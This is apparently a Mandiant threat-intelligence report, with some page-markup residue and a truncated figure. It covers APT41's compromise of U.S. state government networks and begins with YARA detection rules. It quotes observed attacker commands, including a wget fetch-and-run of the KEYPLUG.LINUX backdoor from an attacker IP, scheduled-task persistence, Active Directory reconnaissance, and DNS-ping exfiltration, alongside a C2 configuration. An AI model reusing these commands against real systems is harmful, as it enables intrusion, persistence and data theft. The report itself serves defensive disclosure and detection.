        description = &quot;Matches KEYPLUG XOR-encoded configurations. Locates multiple values of: TCP://, UDP://, WSS://, +http and their pipe-deliminated variant: |TCP://, |UDP://, |WSS://, |+http. Requires at least one instance of 00| in the encoded configuration which corresponds to the sleep value. Removed instances where double-NULLs were present in the generated strings to reduce false positives.&quot;
    strings:
        // TCP
        $tcp1   = &quot;TCP://&quot;  xor(0x01-0x2E)
        $tcp2   = &quot;TCP://&quot;  xor(0x30-0xFF)
        $ptcp1  = &quot;|TCP://&quot; xor(0x01-0x2E)
        $ptcp2  = &quot;|TCP://&quot; xor(0x30-0xFF)
        // UDP
        $udp1   = &quot;UDP://&quot;  xor(0x01-0x2E)
        $udp2   = &quot;UDP://&quot;  xor(0x30-0xFF)
        $pudp1  = &quot;|UDP://&quot; xor(0x01-0x2E)
        $pudp2  = &quot;|UDP://&quot; xor(0x30-0xFF)
        // WSS
        $wss1   = &quot;WSS://&quot;  xor(0x01-0x2E)
        $wss2   = &quot;WSS://&quot;  xor(0x30-0x52)
        $wss3   = &quot;WSS://&quot;  xor(0x54-0xFF)
        $pwss1  = &quot;|WSS://&quot; xor(0x01-0x2E)
        $pwss2  = &quot;|WSS://&quot; xor(0x30-0x52)
        $pwss3  = &quot;|WSS://&quot; xor(0x54-0xFF)
        // HTTP
        $http1  = &quot;+http&quot;   xor(0x01-0x73)
        $http2  = &quot;+http&quot;   xor(0x75-0xFF)
        $phttp1 = &quot;|+http&quot;  xor(0x01-0x73)
        $phttp2 = &quot;|+http&quot;  xor(0x75-0xFF)
        // Sleep value
        $zeros1 = &quot;00|&quot;     xor(0x01-0x2F)
        $zeros2 = &quot;00|&quot;     xor(0x31-0xFF)
    condition:
        filesize &lt; 10MB and
        (uint32(0) == 0x464c457f or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)) and
        for any of ($tcp*,$udp*,$wss*,$http*): (# == 2 and @[2] - @[1] &lt; 200) and
        for any of ($ptcp*,$pudp*,$pwss*,$phttp*): (# == 1) and
        any of ($zeros*)
}</code></pre>
<pre><code>rule M_Hunting_MSIL_BADPOTATO
{
    meta:
        author = "Mandiant"
        description = "Hunting for BADPOTATO samples based on default strings found on the PE VERSIONINFO resource."
    strings:
        $dotnetdll = "\x00_CorDllMain\x00"
        $dotnetexe = "\x00_CorExeMain\x00"
        $s1 = { 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 74 00 6F 00 }
        $s2 = { 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 74 00 6F 00 2E 00 65 00 78 00 65 00 }
        $s3 = { 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 74 00 6F 00 2E 00 65 00 78 00 65 00 }
        $s4 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 42 00 61 00 64 00 50 00 6F 00 74 00 61 00 74 00 6F 00 }
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and 1 of ($dotnet*) and 1 of ($s*)
}</code></pre>

A Summary of APT41 Targeting U.S. State Governments"],null,null,[[null,null,[null,[null,"\u003cp\u003eWritten by: Rufus Brown, Van Ta, Douglas Bienstock, Geoff Ackerman, John Wolfram\u003c/p\u003e\n\u003chr\u003e"]]],[null,null,[null,[null,"\u003cp\u003e\u003cem\u003eUPDATE (Mar. 8): The original post may not have provided full clarity that CVE-2021-44207 (USAHerds) had a patch developed by Acclaim Systems for applicable deployments on or around Nov. 15, 2021. Mandiant cannot speak to the affected builds, deployment, adoption, or other technical factors of this vulnerability patch beyond its availability.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eIn May 2021 Mandiant responded to an APT41 intrusion targeting a United States state government computer network. This was just the beginning of Mandiant’s insight into a persistent months-long campaign conducted by APT41 using vulnerable Internet facing web applications as their initial foothold into networks of interest. APT41 is a prolific Chinese state-sponsored espionage group known to target organizations in both the public and private sectors and also conducts \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/apt41-dual-espionage-and-cyber-crime-operation\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003efinancially motivated activity for personal gain\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eIn this blog post, we detail APT41’s persistent effort that allowed them to successfully compromise at least six U.S. state government networks by exploiting vulnerable Internet facing web applications, including using a zero-day vulnerability in the USAHerds application (CVE-2021-44207) as well as the now infamous zero-day in Log4j (CVE-2021-44228). While the overall goals of APT41's campaign remain unknown, our investigations into each of these intrusions has revealed a variety of new techniques, malware variants, evasion methods, and capabilities.\u003c/p\u003e\n\u003ch2\u003eCampaign Overview\u003c/h2\u003e\n\u003cp\u003eAlthough APT41 has \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/apt41-initiates-global-intrusion-campaign-using-multiple-exploits\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003ehistorically performed mass scanning and exploitation of vulnerabilities\u003c/a\u003e, our investigations into APT41 activity between May 2021 and February 2022 uncovered evidence of a deliberate campaign targeting U.S. state governments. During this timeframe, APT41 successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications, often written in ASP.NET. In most of the web application compromises, APT41 conducted .NET deserialization attacks; however, we have also observed APT41 exploiting SQL injection and directory traversal vulnerabilities.\u003c/p\u003e\n\u003cp\u003eIn the instance where APT41 gained access through a SQL injection vulnerability in a proprietary web application, Mandiant Managed Defense quickly detected and contained the activity; however, two weeks later APT41 re-compromised the network by exploiting a previously unknown zero-day vulnerability in a commercial-off-the-shelf (CoTS) application, USAHerds. In two other instances, Mandiant began an investigation at one state agency only to find that APT41 had also compromised a separate, unrelated agency in the same state.\u003c/p\u003e\n\u003cp\u003eAPT41 was also quick to adapt and use publicly disclosed vulnerabilities to gain initial access into target networks, while also maintaining existing operations. On December 10th, 2021, the Apache Foundation released an \u003ca href\u003d\"https://logging.apache.org/log4j/2.x/security.html\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eadvisory\u003c/a\u003e for a critical remote code execution (RCE) vulnerability in the commonly used logging framework Log4J. Within hours of the advisory, APT41 began exploiting the vulnerability to later compromise at least two U.S. state governments as well as their more traditional targets in the insurance and telecommunications industries.\u003c/p\u003e\n\u003cp\u003eIn late February 2022, APT41 re-compromised two previous U.S. state government victims. Our ongoing investigations show the activity closely aligns with APT41's May-December 2021 activity, representing a continuation of their campaign into 2022 and demonstrating their unceasing desire to access state government networks. A timeline of representative intrusions from this campaign can be seen in Figure 1.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 1: U.S. state government campaign timeline\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-1_mqex.max-1100x1100.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-1_mqex.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-1_mqex.max-1100x1100.png 1095w"," 1060px,  1095px","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-1_mqex.max-1100x1100.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eThe goals of this campaign are currently unknown, though Mandiant has observed evidence of APT41 exfiltrating Personal Identifiable Information (PII). Although the victimology and targeting of PII data is consistent with an espionage operation, Mandiant cannot make a definitive assessment at this time given APT41’s history of moonlighting for personal financial gain.\u003c/p\u003e\n\u003ch2\u003eExploitation of Deserialization Vulnerabilities\u003c/h2\u003e\n\u003cp\u003eAPT41 has primarily used malicious \u003ca href\u003d\"https://docs.microsoft.com/en-us/previous-versions/aspnet/bb386448(v\u003dvs.100)\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eViewStates\u003c/a\u003e to trigger code execution against targeted web applications. Within the ASP.NET framework, ViewState is a method for storing the application’s page and control values in HTTP requests to and from the server. The ViewState is sent to the server with each HTTP request as a Base64 encoded string in a hidden form field. The web server decodes the string and applies additional transformations to the string so that it can be unpacked into data structures the server can use. This process is known as deserialization.\u003c/p\u003e\n\u003cp\u003eInsecure deserialization of user-supplied input can result in code execution. ASP.NET has several \u003ca href\u003d\"https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003einsecure deserialization providers\u003c/a\u003e, including the one used for ViewStates: \u003ca href\u003d\"https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.objectstateformatter\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eObjectStateFormatter\u003c/a\u003e. To prevent a threat actor from manipulating the ViewState and taking advantage of the insecure deserialization provider, the ViewState is protected by a Message Authentication Code (MAC). This MAC is a cryptographically signed hash value that the server uses to ensure that the ViewState has not been tampered with, possibly to trigger code execution. The integrity of the ViewState depends on the application’s machineKey remaining confidential. The machineKey is stored on the application server in a configuration file named web.config.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;machineKey validationKey\u003d\u0026quot;XXXXXXXXXXXXXXXXX\u0026quot; decryptionKey\u003d\u0026quot;XXXXXXXXXXXXXXXXXXXXXX\u0026quot; validation\u003d\u0026quot;SHA1\u0026quot; /\u0026gt;\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 2 Sample machineKey attribute from a web.config file\u003c/div\u003e\n\u003cp\u003eA threat actor with knowledge of the machineKey can construct a malicious ViewState and then generate a new and valid MAC that the server accepts. With a valid MAC, the server will then deserialize the malicious ViewState, resulting in the execution of code on the server. Publicly available tools such as \u003ca href\u003d\"https://github.com/pwntester/ysoserial.net\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eYSoSerial.NET\u003c/a\u003e exist to construct these malicious ViewStates. This is precisely how APT41 initiated their campaign in May 2021.\u003c/p\u003e\n\u003ch3\u003eProprietary Web Application Targeting\u003c/h3\u003e\n\u003cp\u003eIn June 2020, one year before APT41 began this campaign, Mandiant investigated an incident where APT41 exploited a directory traversal vulnerability specifically to read the web.config file for a vulnerable web application on a victim web server. APT41 then used the machineKey values from the web.config file to generate a malicious ViewState payload for a deserialization exploit. Mandiant did not identify how APT41 originally obtained the machineKey values for the proprietary application exploited in May 2021 or the USAHerds application, which was first exploited in July 2021. However, it is likely that APT41 obtained the web.config file through similar means.\u003c/p\u003e\n\u003cp\u003eTo craft malicious ViewStates, APT41 relied on the publicly available Github project YSoSerial.NET. In order to successfully load arbitrary .NET assemblies into memory, APT41 set the DisableActivitySurrogateSelectorTypeCheck property flag to true within the ConfigurationManager.AppSettings class of the running application via the ViewState payload. APT41 subsequently loaded .NET assemblies into memory using additional YSoSerial payloads configured to write webshells to a hardcoded filepath on disk.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 3: Deserialized .NET Assembly (dnSpy)\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-3_aqks.max-1500x1500.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-3_aqks.max-1100x1100.png deployed through a malicious ViewState object by APT41 which utilizes Code Page 936 for the Chinese Simplified keyboard language.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 4: Deserialized JScript Webshell\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-4-img.max-800x800.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-4-img.max-800x800.png 800px","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-4-img.max-800x800.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eFor additional information regarding deserialization exploits and our new hunting rule generation tool ‘\u003ca href\u003d\"https://github.com/mandiant/heyserial\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eHeySerial\u003c/a\u003e’, read our blog post, \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/hunting-deserialization-exploits\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eNow You Serial, Now You Don’t — Systematically Hunting for Deserialization Exploits\u003c/a\u003e.\u003c/p\u003e\n\u003ch3\u003eUSAHerds (CVE-2021-44207) Zero-Day\u003c/h3\u003e\n\u003cp\u003eIn three investigations from 2021, APT41 exploited a zero-day vulnerability in the \u003ca href\u003d\"https://www.tnatc.org/assets/downloads/USAHerds-2019-05-01.pdf\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eUSAHerds\u003c/a\u003e web application. USAHerds is a CoTS application written in ASP.NET and used by 18 states for animal health management. The vulnerability in USAHerds (CVE-2021-44207) is similar to a previously reported vulnerability in Microsoft Exchange Server (\u003ca href\u003d\"https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eCVE-2020-0688\u003c/a\u003e), where the applications used a static validationKey and decryptionKey (collectively known as the machineKey) by default. As a result, all installations of USAHerds shared these values, which is against the best practice of using uniquely generated machineKey values per application instance.\u003c/p\u003e\n\u003cp\u003eGenerating unique machineKey values is critical to the security of an ASP.NET web application because the values are used to secure the integrity of the ViewState.\u003c/p\u003e\n\u003cp\u003eMandiant did not identify how APT41 originally obtained the machineKey values for USAHerds; however, once APT41 obtained the machineKey, they were able to compromise any server on the Internet running USAHerds. As a result, there are potentially additional unknown victims.\u003c/p\u003e\n\u003ch3\u003eLog4j (CVE-2021-44228)\u003c/h3\u003e\n\u003cp\u003eThe most recent APT41 campaign began shortly after the release of CVE-2021-44228 and its related proof-of-concept exploits in December 2021. Exploiting this vulnerability, also known as Log4Shell, causes Java to fetch and deserialize a remote Java object, resulting in potential code execution. Similar to their previous web application targeting, APT41 continued to use YSoSerial generated deserialization payloads to perform reconnaissance and deploy backdoors. Notably, APT41 deployed a new variant of the KEYPLUG backdoor on Linux servers at multiple victims, a malware sub-family we now track as KEYPLUG.LINUX. KEYPLUG is a modular backdoor written in C++ that supports multiple network protocols for command and control (C2) traffic including HTTP, TCP, KCP over UDP, and WSS. APT41 heavily used the Windows version of the KEYPLUG backdoor at state government victims between June 2021 and December 2021, thus the deployment of a ported version of the backdoor closely following the state government campaign was significant.\u003c/p\u003e\n\u003cp\u003eAfter exploiting Log4Shell, APT41 continued to use deserialization payloads to issue ping commands to domains, a technique APT41 frequently used at government victims months prior. An example ping command is shown in Figure 5.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eping -c 1 libxqagv[.]ns[.]dns3[.]cf   \u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eFigure 5: Ping Command to Attacker Controlled Infrastructure\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003eUpon gaining access to a target environment, APT41 performed host and network reconnaissance before deploying KEYPLUG.LINUX to establish a foothold in the environment. Sample commands used to deploy KEYPLUG.LINUX can be seen in Figure 6.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ewget http://103.224.80[.]44:8080/kernel                         \r\nchmod 777 kernel\r\nmv kernel .kernel\r\nnohup ./.kernel \u0026amp;\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 6: Deployment of KEYPLUG.LINUX Following Log4j Exploitation\u003c/div\u003e\n\u003c/div\u003e\n\u003ch2\u003e“All Killer No Filler” Intrusion TTPs\u003c/h2\u003e\n\u003cp\u003eThe updated tradecraft and new malware continue to show APT41 is a highly adaptable and resourceful actor. In this section, we detail the most pertinent post-compromise techniques.\u003c/p\u003e\n\u003ch3\u003eReconnaissance\u003c/h3\u003e\n\u003cp\u003eAfter gaining initial access to an internet-facing server, APT41 performed extensive reconnaissance and credential harvesting. A common tactic seen is the deployment of a \u003ca href\u003d\"https://yck1509.github.io/ConfuserEx/#:~:text\u003dConfuserEx%20is%20an%20free%2C%20open,Graphical%20interface\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eConfuserEx\u003c/a\u003e obfuscated BADPOTATO binary to abuse named pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation. Once APT41 escalated to NT AUTHORITY\\SYSTEM privileges, they copied the local SAM and SYSTEM registry hives to a staging directory for credential harvesting and exfiltration. APT41 has additionally used Mimikatz to execute the lsadump::sam command on the dumped registry hives to obtain locally stored credentials and NTLM hashes.\u003c/p\u003e\n\u003cp\u003eAPT41 also conducted Active Directory reconnaissance by uploading the Windows command-line tool dsquery.exe (MD5: 49f1daea8a115dd6fce51a1328d863cf) and its associated module dsquery.dll (MD5: b108b28138b93ec4822e165b82e41c7a) to a staging directory on the compromised server. Figure 7 shows multiple dsquery commands used to enumerate various Active Directory objects within the environment.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ec:\\programdata\\dsquery.exe * -filter \"(objectCategory\u003dPerson)\" -attr cn title displayName description department company sAMAccountName mail mobile telephoneNumber whenCreated whenChanged logonCount badPwdCount distinguishedName -L -limit 0\r\nc:\\programdata\\dsquery.exe * -filter \"(objectCategory\u003dComputer)\" -attr cn operatingSystem operatingSystemServicePack operatingSystemVersion dNSHostName whenCreated whenChanged lastLogonTimestamp distinguishedName description managedBy mS-DS-CreatorSID -limit 0\r\nc:\\programdata\\dsquery.exe * -filter \"(objectCategory\u003dComputer)\" -attr cn servicePrincipalName -L -limit 0\r\nc:\\programdata\\dsquery.exe * -filter \"(objectCategory\u003dGroup)\" -uc -attr cn sAMAccountName distinguishedName description -limit 0\r\nc:\\programdata\\dsquery.exe * -filter \"(objectClass\u003dorganizationalUnit)\" -attr ou name whenCreated distinguishedName gPLink -limit 0\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 7: dsquery Active Directory Reconnaissance Commands\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eDuring the early stage of one U.S. state government intrusion, Mandiant identified a new malware family used by APT41 we track as DUSTPAN. DUSTPAN is an in-memory dropper written in C++ that leverages ChaCha20 to decrypt embedded payloads. Different variations of DUSTPAN may also load and execute a payload from a hard-coded filepath encrypted in the binary. DUSTPAN is consistent with the publicly named \u003ca href\u003d\"https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/earth-baku-returns\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eStealthVector\u003c/a\u003e, reported by Trend Micro in August 2021. During the intrusion, DUSTPAN was used to drop a Cobalt Strike BEACON backdoor.\u003c/p\u003e\n\u003ch3\u003eAnti-Analysis\u003c/h3\u003e\n\u003cp\u003eAPT41 continues to leverage advanced malware in their existing toolkit, such as the \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/lowkey-hunting-missing-volume-serial-id\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eDEADEYE launcher and LOWKEY\u003c/a\u003e backdoor, with added capabilities and anti-analysis techniques to hinder investigations. During a recent intrusion Mandiant identified a new malware variant, DEADEYE.EMBED, contained in an Alternate Data Stream of a local file. DEADEYE.EMBED variants embed the payload inside of the compiled binary rather than appended to the overlay at the end of the file, as seen in DEADEYE.APPEND.\u003c/p\u003e\n\u003cp\u003eAPT41 commonly packages their malware with VMProtect to slow reverse engineering efforts. During multiple U.S. state government intrusions, APT41 incorporated another anti-analysis technique by chunking a VMProtect packaged DEADEYE binary into multiple sections on disk. Breaking the binary into multiple files reduces the chance that all samples can be successfully acquired during a forensic investigation. Common file naming conventions used by APT41 when deploying DEADEYE on victim hosts can be seen in Figure 8.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 8: DEADEYE Filenames\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-8-img.max-800x800.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-8-img.max-800x800.png 800w, https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-8-img.max-800x800.png 800w"," 800px,  800px","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-8-img.max-800x800.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eThese files would then be combined into a single DLL before execution as seen in Figure 9.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\"cmd\" /c copy /y /b C:\\Users\\public\\syslog_6-*.dat C:\\Users\\public\\syslog.dll\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 9: DEADEYE Command to concatenate DEADEYE sections\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eIn addition to separating their VMProtect packaged malware on disk, APT41 changed the standard VMProtect section names (.vmp) to UPX section names (.upx). By doing so, the malware could evade basic hunting detections that flag binaries packaged with VMProtect. During Log4j exploitation, APT41 similarly chunked a KEYPLUG.LINUX binary into four separate files named “xaa”, ” xab”, ” xac”, and ”xad”. APT41 also packaged the KEYPLUG.LINUX binary with VMProtect and used UPX section names. This technique is very low in prevalence across our malware repository, and even lower in prevalence when searching across ELF files.\u003c/p\u003e\n\u003cp\u003eAPT41 also updated the DEADEYE execution guardrail capabilities used during the campaign. \u003ca href\u003d\"https://attack.mitre.org/techniques/T1480/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eGuardrailing\u003c/a\u003e is a technique used by malware to ensure that the binary only executes on systems that the threat actor intended. DEADEYE samples from older campaigns used the victim computer’s \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/lowkey-hunting-missing-volume-serial-id\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003evolume serial number\u003c/a\u003e but they have since been updated to use the hostname and/or DNS domain during the U.S. state government campaign. To acquire the local computer’s hostname and DNS domain, DEADEYE executes the WinAPI functions GetComputerNameA and/or GetComputerNameExA and provides it as input for a generated decryption key.\u003c/p\u003e\n\u003ch3\u003ePersistence\u003c/h3\u003e\n\u003cp\u003eAPT41 continues to leverage advanced tradecraft to remain persistent and undetected. In multiple instances, the Windows version of the KEYPLUG backdoor leveraged \u003ca href\u003d\"https://attack.mitre.org/techniques/T1102/001/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003edead drop resolvers\u003c/a\u003e on two separate tech community forums. The malware fetches its true C2 address from encoded data on a specific forum post. Notably, APT41 continues to update the community forum posts frequently with new dead drop resolvers during the campaign. APT41 has historically used this unique tradecraft during other intrusions to help keep their C2 infrastructure hidden.\u003c/p\u003e\n\u003cp\u003eTo persist execution of DEADEYE, APT41 has leveraged the schtasks /change command to modify existing scheduled tasks that run under the context of SYSTEM. APT41 commonly uses the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA in scheduled tasks for binary execution, such as the example shown in Figure 10.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSCHTASKS  /Change  /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 10: Modified Scheduled Task\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eAPT41 has leveraged the following Windows scheduled tasks for persistence of DEADEYE droppers in U.S. state government intrusions:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\Microsoft\\Windows\\Ras\\ManagerMobility\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\Microsoft\\Windows\\WDI\\SrvSetupResults\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\\Microsoft\\Windows\\WDI\\USOShared\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAnother technique APT41 used to launch malware is through the addition of a malicious import to the Import Address Table (IAT) of legitimate Windows PE binaries. As a result, once the legitimate binary is executed, it will load the malicious library and call its DllEntryPoint. A modified IAT of a legitimate Microsoft HealthService.exe binary can be seen in Figure 11.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 11: Modified IAT (CFF Explorer)\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-11_fkcx.max-1500x1500.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-11_fkcx.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-11_fkcx.max-1500x1500.png 1442w"," 1060px,  1442px","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-11_fkcx.max-1500x1500.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eAPT41 continues to tailor their malware to victim environments through their stealthy passive backdoor LOWKEY.PASSIVE. The identified LOWKEY.PASSIVE sample listened for incoming connections that request either of the following URL endpoints:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehttp://\u0026lt;HOST:PORT\u0026gt;/USAHerds/Common/%s.css \u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttps://\u0026lt;HOST:PORT\u0026gt;/USAHerds/Common/%s.css\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAPT41 frequently configured LOWKEY.PASSIVE URL endpoints to masquerade as normal web application traffic on an infected server.\u003c/p\u003e\n\u003ch3\u003e“It’s Always Cloudy in Chengdu” — Cloudflare Usage\u003c/h3\u003e\n\u003cp\u003eAPT41 has substantially increased their usage of Cloudflare services for C2 communications and data exfiltration. Specifically, APT41 leveraged \u003ca href\u003d\"https://workers.cloudflare.com/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eCloudflare Workers\u003c/a\u003e to deploy serverless code accessible through the Cloudflare CDN which helps proxy C2 traffic to APT41 operated infrastructure.\u003c/p\u003e\n\u003cp\u003eAt multiple victims, APT41 issued ping commands where the output of a reconnaissance command was prepended to subdomains of Cloudflare proxied infrastructure. Once the ping command was executed, the local DNS resolver attempted to resolve the fabricated domain containing the prepended command output. The forward DNS lookup eventually reached the primary domain's Cloudflare name servers, which were unable to resolve an IP address for the fabricated domain. However, the DNS activity logs of the attacker-controlled domain recorded the DNS lookup of the subdomain, allowing the group to collect the reconnaissance command output.\u003c/p\u003e\n\u003cp\u003eExamples of this technique can be seen in Figure 12 to Figure 15.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$a\u003dwhoami;ping Exfiltration\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eAPT41 leveraged the aforementioned technique for further data exfiltration by hex encoding PII data and prepending the results as subdomains of the attacker-controlled domain. The resulting DNS lookups triggered by the ping commands would be recorded in the activity logs and available to APT41.\u003c/p\u003e\n\u003cp\u003eAPT41’s continued usage of Cloudflare services is further exemplified in recently developed KEYPLUG samples. Mandiant identified a unique capability added to KEYPLUG that leverages the WebSocket over TLS (WSS) protocol for C2 communication. According to Cloudflare, WebSocket traffic can be established through the Cloudflare CDN edge servers, which will proxy data through to the specified origin server.\u003c/p\u003e\n\u003cp\u003eKEYPLUG includes a hardcoded one-byte XOR encoded configuration file that lists the specific communication protocol, servers, and additional settings. After KEYPLUG decodes the hardcoded configuration file at runtime, it will parse the configuration to determine the appropriate network protocol and servers to use for command and control. After the configuration is parsed, KEYPLUG randomly chooses a CIDR block from the list then randomly chooses an IP address within the CIDR block based on the current tick count of the infected computer.\u003c/p\u003e\n\u003cp\u003eFigure 16 details an example configuration file identified during a recent U.S. state government intrusion.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eWSS://104.24.0.0/14;103.22.200.0/22;103.21.244.0/22:443|7600|5|1|afdentry.workstation.eu.org:443\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 16: KEYPLUG Configuration\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eThe CIDR blocks listed in Figure 